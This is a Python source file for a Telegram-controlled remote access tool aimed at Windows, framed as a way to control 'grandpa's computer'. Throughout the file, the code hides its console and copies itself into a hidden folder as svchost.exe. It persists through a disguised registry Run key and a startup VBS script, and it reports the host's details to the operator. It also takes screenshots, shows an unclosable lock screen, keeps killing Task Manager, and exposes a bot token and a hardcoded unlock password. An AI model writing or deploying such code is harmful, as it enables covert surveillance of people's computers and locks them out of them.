# -*- coding: utf-8 -*-
import telebot
import os
import sys
import time
import getpass
import platform
import socket
import uuid
import shutil
import subprocess
from threading import Thread
import datetime
import threading
import tkinter as tk
import json
import hashlib
import winreg
import psutil  # для работы с процессами

# ========== ТВОИ ДАННЫЕ ==========
BOT_TOKEN = '8689333512:AAE1XY-yWka5xvyN-IIgnH5cy47eB_ug5xU'
ADMIN_ID = 8527578981
# ================================

# ========== ПУТИ И НАСТРОЙКИ ==========
HIDDEN_FOLDER = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Updates')
PROCESS_NAME = "svchost.exe"
CONFIG_FILE = os.path.join(HIDDEN_FOLDER, 'config.dat')
LOCK_STATUS_FILE = os.path.join(HIDDEN_FOLDER, 'lock_status.txt')
PC_LOCKED = False
lock_window = None
ANTI_TASK_MANAGER = False  # Статус защиты от диспетчера

# ========== МЕНЕДЖЕР ПАРОЛЕЙ ==========
class PasswordManager:
    def __init__(self):
        self.default_password = "2900058"
        self.password_hash = self.load_or_create_password()
    
    def hash_password(self, password):
        return hashlib.sha256(password.encode()).hexdigest()
    
    def load_or_create_password(self):
        try:
            os.makedirs(HIDDEN_FOLDER, exist_ok=True)
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    data = json.load(f)
                    return data.get('password_hash')
            
            password_hash = self.hash_password(self.default_password)
            with open(CONFIG_FILE, 'w') as f:
                json.dump({'password_hash': password_hash}, f)
            os.system(f'attrib +h "{CONFIG_FILE}"')
            return password_hash
        except:
            return self.hash_password(self.default_password)
    
    def check_password(self, input_password):
        return self.hash_password(input_password) == self.password_hash

pm = PasswordManager()

# ========== ЗАГРУЗКА СТАТУСОВ ==========
try:
    if os.path.exists(LOCK_STATUS_FILE):
        with open(LOCK_STATUS_FILE, 'r') as f:
            status = f.read().strip()
            PC_LOCKED = (status == "locked")
    else:
        os.makedirs(HIDDEN_FOLDER, exist_ok=True)
        with open(LOCK_STATUS_FILE, 'w') as f:
            f.write("unlocked")
except:
    pass

# ========== ФУНКЦИЯ АВТОМАТИЧЕСКОГО ЗАКРЫТИЯ ДИСПЕТЧЕРА ==========
def monitor_task_manager():
    """Постоянно следит за диспетчером задач и закрывает его если защита включена"""
    global ANTI_TASK_MANAGER
    while True:
        if ANTI_TASK_MANAGER:
            try:
                for proc in psutil.process_iter(['name', 'pid']):
                    if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                        proc.kill()
                        print("🔫 Диспетчер задач закрыт (защита)")
                time.sleep(0.5)  # Проверяем каждые 0.5 секунды
            except:
                pass
        else:
            time.sleep(1)  # Если защита выключена, проверяем реже

# Запускаем мониторинг в фоне
threading.Thread(target=monitor_task_manager, daemon=True).start()

# ========== ВОССТАНОВЛЕНИЕ БЛОКИРОВКИ ==========
def restore_lock_if_needed():
    global PC_LOCKED, lock_window
    if PC_LOCKED:
        time.sleep(10)
        def create_lock_window():
            global lock_window
            lock_window = tk.Tk()
            lock_window.title("System Lock")
            lock_window.attributes('-fullscreen', True)
            lock_window.attributes('-topmost', True)
            lock_window.configure(bg='#2b2b2b')
            lock_window.protocol("WM_DELETE_WINDOW", lambda: None)
            
            def block_keys(event):
                return 'break'
            
            lock_window.bind('<Key>', block_keys)
            lock_window.bind('<Control-Key>', block_keys)
            lock_window.bind('<Alt-Key>', block_keys)
            
            frame = tk.Frame(lock_window, bg='#2b2b2b')
            frame.place(relx=0.5, rely=0.4, anchor='center')
            
            label_title = tk.Label(frame, text="🔒 КОМПЬЮТЕР ЗАБЛОКИРОВАН",
                                  fg='#ff6b6b', bg='#2b2b2b', font=('Arial', 32, 'bold'))
            label_title.pack(pady=20)
            
            label_sub = tk.Label(frame, text="Внуки, подождите дедушку",
                                fg='#ffd93d', bg='#2b2b2b', font=('Arial', 18))
            label_sub.pack(pady=10)
            
            label_info = tk.Label(frame, text="Разблокировка через Telegram",
                                 fg='#6bcb77', bg='#2b2b2b', font=('Arial', 14))
            label_info.pack(pady=20)
            
            def check_unlock():
                if not PC_LOCKED:
                    if lock_window:
                        lock_window.destroy()
                else:
                    lock_window.after(1000, check_unlock)
            
            lock_window.after(1000, check_unlock)
            lock_window.mainloop()
        
        threading.Thread(target=create_lock_window, daemon=True).start()

class PCManager:
    def __init__(self):
        self.pc_id = self.get_pc_id()
        self.pc_name = socket.gethostname()
        self.user_name = getpass.getuser()
        self.last_command = None
        
    def get_pc_id(self):
        mac = uuid.getnode()
        return f"PC_{self.get_pc_name()}_{mac % 10000}"
    
    def get_pc_name(self):
        return socket.gethostname()
    
    def get_system_info(self):
        info = {
            'id': self.pc_id,
            'computer': self.pc_name,
            'user': self.user_name,
            'local_ip': socket.gethostbyname(socket.gethostname()),
            'os': platform.system() + ' ' + platform.release(),
            'last_seen': time.strftime('%H:%M %d.%m.%Y')
        }
        return info

pc = PCManager()
bot = telebot.TeleBot(BOT_TOKEN)

# ========== АВТОЗАГРУЗКА ==========
def add_to_startup():
    try:
        if not os.path.exists(HIDDEN_FOLDER):
            os.makedirs(HIDDEN_FOLDER)
        
        current_file = os.path.abspath(sys.argv[0])
        hidden_file = os.path.join(HIDDEN_FOLDER, PROCESS_NAME)
        
        if current_file != hidden_file:
            shutil.copy2(current_file, hidden_file)
        
        subprocess.run(f'attrib +h "{hidden_file}"', shell=True)
        
        # Реестр
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{hidden_file}"')
        except:
            pass
        
        # Папка автозагрузки
        try:
            startup_folder = os.path.join(os.environ['APPDATA'], 
                                         'Microsoft', 'Windows', 'Start Menu', 
                                         'Programs', 'Startup')
            shortcut_path = os.path.join(startup_folder, 'WindowsUpdate.vbs')
            with open(shortcut_path, 'w') as f:
                f.write(f'CreateObject("Wscript.Shell").Run "{hidden_file}", 0, False')
        except:
            pass
        
        with open(os.path.join(HIDDEN_FOLDER, '.installed'), 'w') as f:
            f.write('installed')
        return True
    except:
        return False

def send_startup_notification():
    time.sleep(5)
    try:
        info = pc.get_system_info()
        message = f"""
🟢 Компьютер в сети
━━━━━━━━━━━━━━━━━━━
🆔 ID: {info['id']}
💻 Имя: {info['computer']}
👤 Пользователь: {info['user']}
🌐 IP: {info['local_ip']}
🖥️ ОС: {info['os']}
⏰ Время: {info['last_seen']}
━━━━━━━━━━━━━━━━━━━
        """
        bot.send_message(ADMIN_ID, message)
    except:
        pass

# ========== ФУНКЦИИ ДЛЯ ПОМОЩИ ==========
def press_key(key):
    try:
        import pyautogui
        pyautogui.press(key)
        return True
    except:
        return False

def hotkey(*keys):
    try:
        import pyautogui
        pyautogui.hotkey(*keys)
        return True
    except:
        return False

# ========== ОСНОВНЫЕ КОМАНДЫ ==========
@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.send_message(message.chat.id, "❌ Доступ запрещен")
        return
    
    from telebot.types import ReplyKeyboardMarkup, KeyboardButton
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    buttons = [
        KeyboardButton('🟢 Статус'),
        KeyboardButton('🔴 Выключить'),
        KeyboardButton('🔄 Перезагрузить'),
        KeyboardButton('🔒 Блокировка ПК'),
        KeyboardButton('🔐 Статус блокировки'),
        KeyboardButton('📸 Скриншот'),
        KeyboardButton('🛡️ Защита от диспетчера'),
        KeyboardButton('🔓 Снять защиту диспетчера'),
        KeyboardButton('❌ Закрыть окно (ALT+F4)'),
        KeyboardButton('↩️ Отмена (Ctrl+Z)'),
        KeyboardButton('📋 Копировать (Ctrl+C)'),
        KeyboardButton('📌 Вставить (Ctrl+V)'),
        KeyboardButton('⏎ Enter'),
        KeyboardButton('␣ Пробел'),
        KeyboardButton('⎋ Esc'),
        KeyboardButton('⬆️ Вверх'),
        KeyboardButton('⬇️ Вниз'),
        KeyboardButton('⬅️ Влево'),
        KeyboardButton('➡️ Вправо'),
        KeyboardButton('🔊 Громче'),
        KeyboardButton('🔉 Тише'),
        KeyboardButton('🔇 Выключить звук'),
        KeyboardButton('🏠 Рабочий стол (Win+D)'),
        KeyboardButton('🔒 Заблокировать (Win+L)'),
        KeyboardButton('🔄 Переключить окно'),
        KeyboardButton('🌐 Открыть браузер'),
        KeyboardButton('❌ Закрыть браузер'),
        KeyboardButton('📂 30 вкладок'),
        KeyboardButton('🔍 Поиск'),
        KeyboardButton('📋 Список ПК'),
        KeyboardButton('📊 Диспетчер'),
    ]
    
    markup.add(*buttons)
    
    bot.send_message(
        message.chat.id,
        f"✅ Управление компьютером дедушки\n💻 {pc.pc_name}\n\n"
        f"🆔 ID: {pc.pc_id}\n"
        f"🔐 Для разблокировки: /unlock [пароль]",
        reply_markup=markup
    )

# ========== ЗАЩИТА ОТ ДИСПЕТЧЕРА ==========
@bot.message_handler(func=lambda m: m.text == '🛡️ Защита от диспетчера')
def enable_anti_taskmanager(message):
    if message.chat.id == ADMIN_ID:
        global ANTI_TASK_MANAGER
        ANTI_TASK_MANAGER = True
        bot.send_message(message.chat.id, "🛡️ Защита от диспетчера задач ВКЛЮЧЕНА\nТеперь диспетчер будет автоматически закрываться")

@bot.message_handler(func=lambda m: m.text == '🔓 Снять защиту диспетчера')
def disable_anti_taskmanager(message):
    if message.chat.id == ADMIN_ID:
        global ANTI_TASK_MANAGER
        ANTI_TASK_MANAGER = False
        bot.send_message(message.chat.id, "🔓 Защита от диспетчера задач ОТКЛЮЧЕНА")

# ========== БЛОКИРОВКА ==========
@bot.message_handler(func=lambda m: m.text == '🔒 Блокировка ПК')
def lock_pc_command(message):
    if message.chat.id != ADMIN_ID:
        return
    
    global PC_LOCKED, lock_window
    
    if PC_LOCKED:
        bot.send_message(message.chat.id, "🔒 Компьютер уже заблокирован")
        return
    
    PC_LOCKED = True
    with open(LOCK_STATUS_FILE, 'w') as f:
        f.write("locked")
    
    def create_lock_window():
        global lock_window
        lock_window = tk.Tk()
        lock_window.title("System Lock")
        lock_window.attributes('-fullscreen', True)
        lock_window.attributes('-topmost', True)
        lock_window.configure(bg='#2b2b2b')
        lock_window.protocol("WM_DELETE_WINDOW", lambda: None)
        
        def block_keys(event):
            return 'break'
        
        lock_window.bind('<Key>', block_keys)
        lock_window.bind('<Control-Key>', block_keys)
        lock_window.bind('<Alt-Key>', block_keys)
        
        frame = tk.Frame(lock_window, bg='#2b2b2b')
        frame.place(relx=0.5, rely=0.4, anchor='center')
        
        label_title = tk.Label(frame, text="🔒 КОМПЬЮТЕР ЗАБЛОКИРОВАН",
                              fg='#ff6b6b', bg='#2b2b2b', font=('Arial', 32, 'bold'))
        label_title.pack(pady=20)
        
        label_sub = tk.Label(frame, text="Внуки, подождите дедушку",
                            fg='#ffd93d', bg='#2b2b2b', font=('Arial', 18))
        label_sub.pack(pady=10)
        
        label_info = tk.Label(frame, text="Разблокировка через Telegram",
                             fg='#6bcb77', bg='#2b2b2b', font=('Arial', 14))
        label_info.pack(pady=20)
        
        def check_unlock():
            if not PC_LOCKED:
                if lock_window:
                    lock_window.destroy()
            else:
                lock_window.after(1000, check_unlock)
        
        lock_window.after(1000, check_unlock)
        lock_window.mainloop()
    
    threading.Thread(target=create_lock_window, daemon=True).start()
    bot.send_message(message.chat.id, "🔒 Компьютер заблокирован. Для разблокировки: /unlock ПАРОЛЬ")

@bot.message_handler(commands=['unlock'])
def unlock_pc(message):
    if message.chat.id != ADMIN_ID:
        return
    
    global PC_LOCKED, lock_window
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❌ Используй: /unlock ПАРОЛЬ")
        return
    
    if pm.check_password(parts[1]):
        PC_LOCKED = False
        with open(LOCK_STATUS_FILE, 'w') as f:
            f.write("unlocked")
        bot.send_message(message.chat.id, "✅ Компьютер разблокирован")
    else:
        bot.send_message(message.chat.id, "❌ Неверный пароль")

@bot.message_handler(func=lambda m: m.text == '🔐 Статус блокировки')
def lock_status(message):
    if message.chat.id == ADMIN_ID:
        status = "🔴 ЗАБЛОКИРОВАН" if PC_LOCKED else "🟢 РАБОТАЕТ"
        bot.send_message(message.chat.id, f"Статус компьютера: {status}")

# ========== ОСНОВНЫЕ ФУНКЦИИ ==========
@bot.message_handler(func=lambda m: m.text == '🟢 Статус')
def status(message):
    if message.chat.id == ADMIN_ID:
        info = pc.get_system_info()
        bot.send_message(
            message.chat.id,
            f"🟢 Компьютер в сети\n"
            f"Последняя активность: {info['last_seen']}\n"
            f"💻 {info['computer']} | 👤 {info['user']}\n"
            f"🌐 IP: {info['local_ip']}"
        )

@bot.message_handler(func=lambda m: m.text == '🔴 Выключить')
def shutdown(message):
    if message.chat.id == ADMIN_ID:
        bot.send_message(message.chat.id, "🔴 Выключение через 10 секунд...")
        time.sleep(2)
        os.system("shutdown /s /t 10")

@bot.message_handler(func=lambda m: m.text == '🔄 Перезагрузить')
def restart(message):
    if message.chat.id == ADMIN_ID:
        bot.send_message(message.chat.id, "🔄 Перезагрузка через 10 секунд...")
        time.sleep(2)
        os.system("shutdown /r /t 10")

@bot.message_handler(func=lambda m: m.text == '📸 Скриншот')
def screenshot(message):
    if message.chat.id == ADMIN_ID:
        try:
            import pyautogui
            bot.send_message(message.chat.id, "📸 Делаю скриншот...")
            filename = f"screenshot_{int(time.time())}.png"
            pyautogui.screenshot().save(filename)
            with open(filename, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(filename)
        except:
            bot.send_message(message.chat.id, "❌ Ошибка скриншота")

# ========== КЛАВИАТУРНЫЕ ПОМОЩНИКИ ==========
@bot.message_handler(func=lambda m: m.text == '❌ Закрыть окно (ALT+F4)')
def alt_f4(message):
    if message.chat.id == ADMIN_ID:
        hotkey('alt', 'f4')
        bot.send_message(message.chat.id, "❌ Окно закрыто")

@bot.message_handler(func=lambda m: m.text == '↩️ Отмена (Ctrl+Z)')
def ctrl_z(message):
    if message.chat.id == ADMIN_ID:
        hotkey('ctrl', 'z')
        bot.send_message(message.chat.id, "↩️ Отмена выполнена")

@bot.message_handler(func=lambda m: m.text == '📋 Копировать (Ctrl+C)')
def ctrl_c(message):
    if message.chat.id == ADMIN_ID:
        hotkey('ctrl', 'c')
        bot.send_message(message.chat.id, "📋 Скопировано")

@bot.message_handler(func=lambda m: m.text == '📌 Вставить (Ctrl+V)')
def ctrl_v(message):
    if message.chat.id == ADMIN_ID:
        hotkey('ctrl', 'v')
        bot.send_message(message.chat.id, "📌 Вставлено")

@bot.message_handler(func=lambda m: m.text == '⏎ Enter')
def press_enter(message):
    if message.chat.id == ADMIN_ID:
        press_key('enter')
        bot.send_message(message.chat.id, "⏎ Enter нажат")

@bot.message_handler(func=lambda m: m.text == '␣ Пробел')
def press_space(message):
    if message.chat.id == ADMIN_ID:
        press_key('space')
        bot.send_message(message.chat.id, "␣ Пробел нажат")

@bot.message_handler(func=lambda m: m.text == '⎋ Esc')
def press_esc(message):
    if message.chat.id == ADMIN_ID:
        press_key('esc')
        bot.send_message(message.chat.id, "⎋ Esc нажат")

@bot.message_handler(func=lambda m: m.text == '⬆️ Вверх')
def up(message):
    if message.chat.id == ADMIN_ID:
        press_key('up')

@bot.message_handler(func=lambda m: m.text == '⬇️ Вниз')
def down(message):
    if message.chat.id == ADMIN_ID:
        press_key('down')

@bot.message_handler(func=lambda m: m.text == '⬅️ Влево')
def left(message):
    if message.chat.id == ADMIN_ID:
        press_key('left')

@bot.message_handler(func=lambda m: m.text == '➡️ Вправо')
def right(message):
    if message.chat.id == ADMIN_ID:
        press_key('right')

# ========== ЗВУК ==========
@bot.message_handler(func=lambda m: m.text == '🔊 Громче')
def volume_up(message):
    if message.chat.id == ADMIN_ID:
        for _ in range(5):
            press_key('volumeup')
        bot.send_message(message.chat.id, "🔊 Громкость увеличена")

@bot.message_handler(func=lambda m: m.text == '🔉 Тише')
def volume_down(message):
    if message.chat.id == ADMIN_ID:
        for _ in range(5):
            press_key('volumedown')
        bot.send_message(message.chat.id, "🔉 Громкость уменьшена")

@bot.message_handler(func=lambda m: m.text == '🔇 Выключить звук')
def mute(message):
    if message.chat.id == ADMIN_ID:
        press_key('volumemute')
        bot.send_message(message.chat.id, "🔇 Звук выключен")

# ========== УПРАВЛЕНИЕ ОКНАМИ ==========
@bot.message_handler(func=lambda m: m.text == '🏠 Рабочий стол (Win+D)')
def show_desktop(message):
    if message.chat.id == ADMIN_ID:
        hotkey('win', 'd')
        bot.send_message(message.chat.id, "🏠 Рабочий стол показан")

@bot.message_handler(func=lambda m: m.text == '🔒 Заблокировать (Win+L)')
def win_lock(message):
    if message.chat.id == ADMIN_ID:
        hotkey('win', 'l')
        bot.send_message(message.chat.id, "🔒 Компьютер заблокирован")

@bot.message_handler(func=lambda m: m.text == '🔄 Переключить окно')
def alt_tab(message):
    if message.chat.id == ADMIN_ID:
        hotkey('alt', 'tab')
        bot.send_message(message.chat.id, "🔄 Окно переключено")

# ========== БРАУЗЕР ==========
@bot.message_handler(func=lambda m: m.text == '🌐 Открыть браузер')
def browser_open(message):
    if message.chat.id == ADMIN_ID:
        os.system("start https://google.com")
        bot.send_message(message.chat.id, "🌐 Браузер открыт")

@bot.message_handler(func=lambda m: m.text == '❌ Закрыть браузер')
def browser_close(message):
    if message.chat.id == ADMIN_ID:
        os.system("taskkill /f /im chrome.exe 2>nul")
        os.system("taskkill /f /im msedge.exe 2>nul")
        os.system("taskkill /f /im firefox.exe 2>nul")
        bot.send_message(message.chat.id, "❌ Браузеры закрыты")

@bot.message_handler(func=lambda m: m.text == '📂 30 вкладок')
def thirty_tabs(message):
    if message.chat.id == ADMIN_ID:
        bot.send_message(message.chat.id, "📂 Открываю 30 вкладок...")
        for i in range(30):
            os.system(f"start https://google.com/search?q=страница+{i+1}")
            time.sleep(0.2)
        bot.send_message(message.chat.id, "✅ 30 вкладок открыто")

@bot.message_handler(func=lambda m: m.text == '🔍 Поиск')
def search(message):
    if message.chat.id == ADMIN_ID:
        msg = bot.send_message(message.chat.id, "🔍 Введи запрос:")
        bot.register_next_step_handler(msg, process_search)

def process_search(message):
    query = message.text.strip()
    url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
    os.system(f"start {url}")
    bot.send_message(message.chat.id, f"🔍 Ищем: {query}")

@bot.message_handler(func=lambda m: m.text == '📋 Список ПК')
def list_pcs(message):
    if message.chat.id == ADMIN_ID:
        info = pc.get_system_info()
        bot.send_message(
            message.chat.id,
            f"📋 Текущий ПК:\n{info['computer']} ({info['user']})\nID: {info['id']}"
        )

@bot.message_handler(func=lambda m: m.text == '📊 Диспетчер')
def task_manager(message):
    if message.chat.id == ADMIN_ID:
        os.system("taskmgr")
        bot.send_message(message.chat.id, "📊 Диспетчер задач открыт")

# ========== ЗАПУСК ==========
def main():
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    marker = os.path.join(HIDDEN_FOLDER, '.installed')
    if not os.path.exists(marker):
        add_to_startup()
    
    Thread(target=send_startup_notification).start()
    restore_lock_if_needed()
    
    while True:
        try:
            bot.polling(non_stop=True, interval=0)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    main()